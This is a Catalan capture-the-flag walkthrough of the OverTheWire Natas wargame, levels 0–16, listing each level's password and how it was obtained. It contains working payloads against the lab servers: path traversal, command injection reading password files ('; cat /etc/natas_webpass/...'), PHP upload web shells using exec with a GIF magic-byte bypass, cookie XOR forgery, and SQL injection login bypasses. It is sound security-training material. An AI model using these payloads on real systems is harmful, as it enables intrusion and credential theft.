# OVERTHEWIRE GAMES - NATAS

# NATAS 0

    Username: natas0
    Password: natas0
    URL:      http://natas0.natas.labs.overthewire.org

    Inspeccionem la pàgina web amb click botó dret 'inspect'.
    Podrem veure el el contingut HTML de la pàgina. També ho podem fer:
    view-source:http://natas0.natas.labs.overthewire.org/
    Mirem el 'body' i trobarem la password. 
    
    <!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->

# NATAS 1

    Username: natas1
    Password: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
    URL:      http://natas1.natas.labs.overthewire.org

    NO ens deixa clickar botó dret per inspeccionar. Anem a:
    view-source:http://natas1.natas.labs.overthewire.org/

    Dintre del body trobem:
    <!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->

# NATAS 2

    Username: natas2
    Password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
    URL:      http://natas2.natas.labs.overthewire.org

    Escanejant el 'source code' trobem que hi ha una imatge que es diu 'pixel.png' en el directori /files.
    Si ens dirigim al directori /files, trobem 2 fitxers (pixel.png i users.txt)
    Contingut users.txt:
    # username:password
    alice:BYNdCesZqW
    bob:jw2ueICLvT
    charlie:G5vCxkVV3m
    natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
    eve:zo4mJWyNj2
    mallory:9urtcpzBmH

    Podem veure l'users.txt dintre el directori ja que ens deixa indexar tot el que estigui dintre d'aquest directori. Per tant, tot el que estigui dintre /files, és públic. Podem fer 'fuzzing'.

# NATAS 3
    
    Username: natas3
    Password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
    URL:      http://natas3.natas.labs.overthewire.org

    Inspeccionant el 'source code', trobem una frase un tant curiosa:
    <!-- No more information leaks!! Not even Google will find it this time... -->

    Si Google no ho pot indexar, és perquè el fitxer 'robots.txt' ens ho esta capant. Utilitzant robots.txt, no podrem fer-li OSINT a la pàgina web. 
    Sapiguent això, ens dirigim a l'URL:
    http://natas3.natas.labs.overthewire.org/robots.txt

    El contingut del fitxer 'robots.txt' és:
    User-agent: *
    Disallow: /s3cr3t/

    Ens dirigim a: http://natas3.natas.labs.overthewire.org/s3cr3t/
    Trobem el fitxer 'users.txt'. Contingut:
    natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

    Han tornat a liarla com el NATAS2, ja que no hauriem de ser capaços de veure el fitxer 'users.txt'.

# NATAS 4

    Username: natas4
    Password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
    URL:      http://natas4.natas.labs.overthewire.org

    Escanejant el 'source code' trobem aquest text:
    Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

    Trobem el fitxer 'index.php', que realment és un botó de "Refresh page".
    Com que sabem que hem de venir de la URL que ens diuen, hem de "falsificar" la URL d'origen, és a dir, l'HTTP header 'referer'.

    Amb el BurpSuite podem veure aquests headers i amb el Repeater, analitzem la pàgina web i veiem el referer:
    Referer: http://natas4.natas.labs.overthewire.org/

    Canviem aquesta URL per natas5 i trobem la password.
    Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

# NATAS 5

    Username: natas5
    Password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
    URL:      http://natas5.natas.labs.overthewire.org

    A la pàgina web, de moment trobem aquest text:
    Access disallowed. You are not logged in

    Escanejant amb el Burpsuite, trobem un camp que és:
    Cookie: loggedin=0.
    Suposem que 0=false, si posem un 1(=true), podem veure la password.
    Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

# NATAS 6

    Username: natas6
    Password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
    URL:      http://natas6.natas.labs.overthewire.org

    Trobem que hi ha un formulari amb "method=post".
    Ens diu: Input Secret.
    També hi ha un enllaç d'un fitxer "index-source.html".
    Aquest fitxer té un contingut PHP:
    <?
    include "includes/secret.inc";

        if(array_key_exists("submit", $_POST)) {
            if($secret == $_POST['secret']) {
            print "Access granted. The password for natas7 is <censored>";
        } else {
            print "Wrong secret";
        }
        }
    ?>

    Ens dirigim a:
    http://natas6.natas.labs.overthewire.org/includes/secret.inc

    I obtenim:
    <?
    $secret = "FOEIUWGHFEEUHOFUOIU";
    ?>

    Si en el formulari li posem aquesta secret, obtenim la password de natas7:
    Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

    Han passat el check de quan anem a /includes, no ens mostra cap fitxer, és més, ens surt FORBIDDEN. Per tant, han tret l'indexador.
    Però l'han liat en què la password és en text clar i a més, que qualsevol usuari pot accedir-hi. Hauria d'accedir-s'hi nomès des del server (secret definit de forma Global).

# NATAS 7

    Username: natas7
    Password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
    URL:      http://natas7.natas.labs.overthewire.org

    Veiem dos links: un "HOME" i un "ABOUT".
    Si cliquem sobre el Home, no ens mostra res en concret, però a la URL hi veiem:
    http://natas7.natas.labs.overthewire.org/index.php?page=home
    És a dir, una variable "page" dintre del fitxer "index.php".
    El primer que se m'ha acudit és un path traversal, he provat:
    https://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../etc/passwd

    Ens mostra el fitxer. Per tant, és vulnerable.

    Sabem que les passwords s'emmagatzemen a:
    /etc/natas_webpass/natasX.
    Per tant, fem:
    http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 i ens mostra la password.


# NATAS 8

    Username: natas8
    Password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
    URL:      http://natas8.natas.labs.overthewire.org

    Clicant sobre "view sourcecode" trobem un tros de PHP:
    <?
    $encodedSecret = "3d3d516343746d4d6d6c315669563362";

    function encodeSecret($secret) {
        return bin2hex(strrev(base64_encode($secret)));
    }
    if(array_key_exists("submit", $_POST)) {
        if(encodeSecret($_POST['secret']) == $encodedSecret) {
        print "Access granted. The password for natas9 is <censored>";
        } else {
        print "Wrong secret";
        }
    }
    ?>

    El code ens mostra que la $encodedSecret es fa convertint el text en base64, desprès li fa un 'string reverse' i finalment converteix converteix el binari en hexadecimal.
    Per tenir la $decodedSecret hem de fer el contrari. Un hex2bin, un reverse i un base64 decode.
    És a dir, el 'contrari' del coded.

    Ho fem:
    <?php
    function decodeSecret($secret) {
        return base64_decode(strrev(hex2bin($secret)));
    }
    echo decodeSecret("3d3d516343746d4d6d6c315669563362");
    ?>

    Ens dona: oubWYf2kBq

    Si ho posem al formulari de la nostra pàgina web, ens dona la password:
    Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
# NATAS 9

    Username: natas9
    Password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
    URL:      http://natas9.natas.labs.overthewire.org

    Cliquem sobre 'view sourcecode' ens mostra:
    <form>
    Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
    </form>

    Output:
    <pre>
    <?
    $key = "";
    if(array_key_exists("needle", $_REQUEST)) {
        $key = $_REQUEST["needle"];
    }
    if($key != "") {
        passthru("grep -i $key dictionary.txt");
    }
    ?>

    Si escrivim en el formulari: | pwd
    Ens mostra: /var/www/natas/natas9

    Per tant, fem el cat de la password.
    | cat /etc/natas_webpass/natas10 
    També funciona amb:
    ; cat /etc/natas_webpass/natas10

    Output:
    D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE


# NATAS 10

    Username: natas10
    Password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
    URL:      http://natas10.natas.labs.overthewire.org

    Cliquem sobre 'view sourcecode'.
    Tenim el contingut interessant:
    
    For security reasons, we now filter on certain characters<br/><br/>
    <form>
    Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
    </form>

    Output:
    <pre>
    <?
    $key = "";
    if(array_key_exists("needle", $_REQUEST)) {
        $key = $_REQUEST["needle"];
    }
    if($key != "") {
        if(preg_match('/[;|&]/',$key)) {
            print "Input contains an illegal character!";
        } else {
            passthru("grep -i $key dictionary.txt");
        }
    }
    ?>

    Com que hi ha un 'grep -i", ens aprofitem i hi posem a davant el fitxer que hi volem posar:
    a /etc/natas_webpass/natas11

    Expressió total:
    grep -i a /etc/natas_webpass/natas11 dictionary.txt

    Ens dona la password:
    /etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg


#  NATAS 11

    Username: natas11
    Password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
    URL:      http://natas11.natas.labs.overthewire.org


    A la pàgina web ens mostra:
    Cookies are protected with XOR encryption
    Background color: #fffffff

    Clicant sobre 'view sourcecode', tenim:

    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

    function xor_encrypt($in) {
        $key = '<censored>';
        $text = $in;
        $outText = '';
        // Iterate through each character
        for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
        }

        return $outText;
    }
    function loadData($def) {
        global $_COOKIE;
        $mydata = $def;
        if(array_key_exists("data", $_COOKIE)) {
        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
        if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
            $mydata['showpassword'] = $tempdata['showpassword'];
            $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
        }
        }
        return $mydata;
    }
    function saveData($d) {
        setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
    }
    $data = loadData($defaultdata);
    if(array_key_exists("bgcolor",$_REQUEST)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
            $data['bgcolor'] = $_REQUEST['bgcolor'];
        }
    }
    saveData($data);
    ?>
    <h1>natas11</h1>
    <div id="content">
    <body style="background: <?=$data['bgcolor']?>;">
    Cookies are protected with XOR encryption<br/><br/>
    <?
    if($data["showpassword"] == "yes") {
        print "The password for natas12 is <censored><br>";
    }
    ?>


    La cookie que ens dona: MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D

    Base64 decode: 0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n67

    Com que tenim el JSON, extret de:
    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
    A JSON:
    {"showpassword": "no", "bgcolor": "#ffffff"}

    Ara podem obtenir la $key, perquè al esta creat amb XOR i tenim les dues variables ($cookie i $json):

    <?php
    $defaultdata = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));

    echo $defaultdata;

    $cookieS = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=");

    echo "\n";
    echo $cookieS;

    echo "\n";
    echo($defaultdata ^ $cookieS);
    ?>

    {"showpassword":"no","bgcolor":"#ffffff"}
    0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n6
    KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK

    $key = KNHL

    El nou xor:
    0l;$$98-8=?#9*jvi7-?ibj.,-' $<jvim.*-(.*i3
    Base64 encode:
    MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
    Per tant, això ara és la nostra nova cookie amb el "showpassword=yes".

    Posem la Cookie al navegador i cliquem "set color" i obtenim:
    The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG


#  NATAS 12

    Username: natas12
    Password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
    URL:      http://natas12.natas.labs.overthewire.org

```
    <?php
    function genRandomString() {
        $length = 10;
        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
        $string = "";
        for ($p = 0; $p < $length; $p++) {
            $string .= $characters[mt_rand(0, strlen($characters)-1)];
        }
        return $string;
    }
    function makeRandomPath($dir, $ext) {
        do {
        $path = $dir."/".genRandomString().".".$ext;
        } while(file_exists($path));
        return $path;
    }
    function makeRandomPathFromFilename($dir, $fn) {
        $ext = pathinfo($fn, PATHINFO_EXTENSION);
        return makeRandomPath($dir, $ext);
    }
    if(array_key_exists("filename", $_POST)) {
        $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
            if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
            echo "File is too big";
        } else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
                echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
            } else{
                echo "There was an error uploading the file, please try again!";
            }
        }
    } else {
    ?>
    <form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
    <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
    Choose a JPEG to upload (max 1KB):<br/>
    <input name="uploadedfile" type="file" /><br />
    <input type="submit" value="Upload File" />
    </form>
    <?php } ?>
```
    Aquesta pàgina el que fa bàsicament és que tu pots penjar un fitxer JPEG (max d'1KB) i després pots anar a veure la imatge en qüestió.
    Primer comprovem si podem penjar altres fitxers que no només siguin format "JPEG".
    Comprovem que si penjem un fitxer .txt (per exemple), ens el deixa pujar, però no el renderitza (no veiem el contingut).
    Procedim a crear un fitxer .php on ens mostri la password de l'usuari 13.
    Tot i així, utilitzarem el mètode "exec" perquè el servidor executi la funció en bash que li passem.

    Fitxer .php, amb payload:
    <?php
    echo(exec('cat /etc/natas_webpass/natas13'));
    ?>

    Un cop el fitxer s'ha pujat, inspeccionem el contingut de la nostra pàgina web i veurem una línia com aquesta:
        <input type="hidden" name="filename" value="s9pspizx1z.jpg">
    Des del navegador modifiquem el nom de .jpg a .php:
        <input type="hidden" name="filename" value="s9pspizx1z.php">
    I li donem al botó de 'Upload File', podrem veure:
        The file upload/s9pspizx1z.php has been uploaded.
    
    Ens hi dirigim i ens mostrara el contingut del fitxer, és a dir, la password.

    Com que estem executant a través del navegador, realment som l'usuari www-data.
    La vulnerabilitat esta en que aixó és una miss-config ja que aquest usuari no hauria de poder mostrar aquest fitxer.
    Apart de que no ens hauria de poder deixar pujar fitxers que no siguin JPEG.


#  NATAS 13

    Username: natas13
    Password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
    URL:      http://natas13.natas.labs.overthewire.org


    <div id="content">
    For security reasons, we now only accept image files!<br/><br/>
    <?php
    function genRandomString() {
        $length = 10;
        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
        $string = "";
        for ($p = 0; $p < $length; $p++) {
            $string .= $characters[mt_rand(0, strlen($characters)-1)];
        }
        return $string;
    }
    function makeRandomPath($dir, $ext) {
        do {
        $path = $dir."/".genRandomString().".".$ext;
        } while(file_exists($path));
        return $path;
    }
    function makeRandomPathFromFilename($dir, $fn) {
        $ext = pathinfo($fn, PATHINFO_EXTENSION);
        return makeRandomPath($dir, $ext);
    }
    if(array_key_exists("filename", $_POST)) {
        $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
        $err=$_FILES['uploadedfile']['error'];
        if($err){
            if($err === 2){
                echo "The uploaded file exceeds MAX_FILE_SIZE";
            } else{
                echo "Something went wrong :/";
            }
        } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
            echo "File is too big";
        } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
            echo "File is not an image";
        } else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
                echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
            } else{
                echo "There was an error uploading the file, please try again!";
            }
        }
    } else {
    ?>
    <form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
    <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />


    Veiem que és mes o menys igual que l'anterior, però ara comprova si és un fitxer JPEG.
    Veiem que la funció que ho comprova és "exif_imagetype", per tant, esta utilitzant 'exif'.
    Exif són les metadades de les imatges.

    Fent una prova amb una imatge (per exemple: exiftool photo.jpeg), veig que ens mostra molts 'fields' útils:
    "File size, File Type, File Type Extension, MIME Type, etc"
    Tots els possibles: https://exiftool.org/TagNames/EXIF.html

    Per tant, crec que podem canviar l'imagetype perquè ens ho pilli com un fitxer php i poder executar el nostre codi.
    Per fer-ho, busco sobre els 'Magic Numbers', que són simplement els primers bytes d'un fitxer per identificar de quin tipus són.
    
    Per trobar + info de la imatge:
        file photo.jpg               
        photo.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 2392x2500, components 3
    Per trobar els primers bytes:
        xxd photo.jpg | head
        00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H
    Tenim que els fitxers '.jpg', començen amb aquests bytes.

    Provem a fer una prova en local de modificar un fitxer:
    (creen un fitxer .txt i li apliquem aquest contingut, on podem comprovar que ens detecta com si fos un GIF).

        echo -n -e 'GIF87a' > file.txt
        file file.txt 
        file.txt: GIF image data, version 87a,

    
    Modifiquem el nostre fitxer perquè la web s'ho tragui i ara tenim:

        GIF8;
        <?php
        echo(exec('cat /etc/natas_webpass/natas14'));
        ?>


#  NATAS 14

    Username: natas14
    Password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
    URL:      http://natas14.natas.labs.overthewire.org

    <h1>natas14</h1>
    <div id="content">
    <?php
    if(array_key_exists("username", $_REQUEST)) {
        $link = mysqli_connect('localhost', 'natas14', '<censored>');
        mysqli_select_db($link, 'natas14');
        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
        if(array_key_exists("debug", $_GET)) {
            echo "Executing query: $query<br>";
        }
        if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
                echo "Successful login! The password for natas15 is <censored><br>";
        } else {
                echo "Access denied!<br>";
        }
        mysqli_close($link);
    } else {
    ?>
    <form action="index.php" method="POST">
    Username: <input name="username"><br>
    Password: <input name="password"><br>
    <input type="submit" value="Login" />
    </form>
    <?php } ?>

    
    Veiem que la pàgina web esta formada per un login (d'username i password) i si aconseguim entrar amb algún usuari, ens mostrara la contrasenya.
    Tenim la següent sentència on veiem que pot ser injectable.
        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    
    Dedueixo que puc fer una injecció SQL, per tant, ara és el moment d'utilitzar caràcters estranys i aplicar seqüències SQL interessants.
    Per fer-ho fàcil i poder veure més clarament la sentència; en el login inserim "a" i "b", ens queda aixi:
        $query = "SELECT * from users where username="a" and password="b";
    El nostre payload:
        $query = "SELECT * from users where username="a" and password=""or 1=1-- -";
        $query = "SELECT * from users where username="a" and password=""or 1=1#";

    Estem inserint: "or 1=1-- -
    Bàsicament, la query està fent: (FALSE I FALSE) or TRUE.
    Sempre serà TRUE, per tant esta fent un SELECT * form users.
    Per això quan ens diu que ha de tenir més de 0 rows, ens ho pilla.

    Aquí és important utilitzar el comentari, perquè sinó no hi hauria cap row i no ens mostraria la password.
    
    La vulnerabilitat està en que no es saneja el codi d'entrada de la sentència SQL.
    És a dir, li podem passar qualsevol sentència SQL que sempre ho executarà.


#  NATAS 15

    Username: natas15
    Password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
    URL:      http://natas15.natas.labs.overthewire.org

    <div id="content">
    <?php
    /*
    CREATE TABLE `users` (
    `username` varchar(64) DEFAULT NULL,
    `password` varchar(64) DEFAULT NULL
    );
    */
    if(array_key_exists("username", $_REQUEST)) {
        $link = mysqli_connect('localhost', 'natas15', '<censored>');
        mysqli_select_db($link, 'natas15');
        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
        if(array_key_exists("debug", $_GET)) {
            echo "Executing query: $query<br>";
        }
        $res = mysqli_query($link, $query);
        if($res) {
        if(mysqli_num_rows($res) > 0) {
            echo "This user exists.<br>";
        } else {
            echo "This user doesn't exist.<br>";
        }
        } else {
            echo "Error in query.<br>";
        }
        mysqli_close($link);
    } else {
    ?>

    Tenim un exercici semblant a l'anterior; una base de dades i una sentència SQL.
    En aquest cas però, no tenim un login. Simplement mira si un usuari existeix o no.
    El problema està en que si aconseguim fer una injecció SQL, mai aconseguirem el password.
    Haurem de fer un atac de força bruta i anar treient el password lletra a lletra.

    Si en l'usuari posem: a, ens torna: This user doesn't exist.
    Si en l'usuari posem: " or 1=1#, ens torna: This user exists. --> He aprofitat el codi de l'anterior natas.
    Igual que si posem natas16, també ens mostra que l'usuari existeix.

    Procedim a crear un script (natas16_1.py) on farem moltes peticions a la pàgina del natas.
    Aquestes peticions estaran compostes d'una sentència SQL a l'apartat de l'username:
        'natas16" and password like binary "{}%"#'.format(partialpass)
    D'aquesta manera, l'user natas16 sempre existirà, i a més a més, li demanem la password d'aquest.

    La història està en que si l'usuari és natas16 i la password comença per 'a', ens tornarà el text "This user exists".
    Però si l'usuari és natas16 i la password comença per 'b', ens tornarà el text "This user doesn't exists".
    Per tant, haurem de fer un bucle, anar caràcter a caràcter (a-z, A-Z i 0-9) i sempre que ens torni el text de "This user exists", serà un caràcter de la password.


#  NATAS 16

    Username: natas16
    Password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
    URL:      http://natas16.natas.labs.overthewire.org